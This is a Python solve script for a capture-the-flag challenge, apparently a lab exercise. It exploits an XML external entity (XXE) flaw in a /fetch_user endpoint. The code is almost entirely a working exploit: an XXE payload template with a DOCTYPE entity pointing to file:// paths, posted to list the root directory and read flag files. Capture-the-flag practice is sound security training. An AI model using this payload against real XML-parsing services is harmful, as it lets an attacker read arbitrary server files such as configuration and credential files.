#!/usr/bin/env python
"""Archived (XXE, 250 pts) - http://54.72.82.22:8230

The /fetch_user endpoint parses a client-supplied XML body with an
XML parser that resolves external entities and echoes the value back
(and, notably, accepts a directory as a file:// entity, returning a
newline-separated directory listing).

Classic file-read XXE:
  1. list "/" to discover the randomised flag filename (the "catalog
     card points to a second archive" hint),
  2. read that file and pull the flag out.

Run:  python solve.py
"""
import re
import sys

import requests

BASE = "http://54.72.82.22:8230"
URL = BASE + "/fetch_user"

TEMPLATE = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE request [<!ENTITY xxe SYSTEM "file://%s">]>'
    '<request><id>&xxe;</id></request>'
)


def read(path):
    """Return the file/dir contents at `path`, or None if the parser refused."""
    r = requests.post(
        URL,
        data=TEMPLATE % path,
        headers={"Content-Type": "application/xml"},
        timeout=15,
    )
    body = r.text
    if "<error>" in body:
        return None
    m = re.search(r"<id>(.*)</id>", body, re.S)
    return m.group(1) if m else body


def main():
    root = read("/")
    if root is None:
        sys.exit("[-] XXE failed: could not list /")

    names = [n for n in root.split("\n") if n.strip()]
    print("[*] / contains:", " ".join(names))

    flag_files = [n for n in names if n.startswith("flag") and n.endswith(".txt")]
    if not flag_files:
        sys.exit("[-] no flag*.txt found at /")

    for name in flag_files:
        content = read("/" + name)
        if content:
            m = re.search(r"safctf\{[0-9a-f]{32}\}", content)
            if m:
                print("[+] flag file:", "/" + name)
                print("[+] FLAG:", m.group(0))
                return m.group(0)

    sys.exit("[-] flag file found but no safctf{...} inside")


if __name__ == "__main__":
    main()
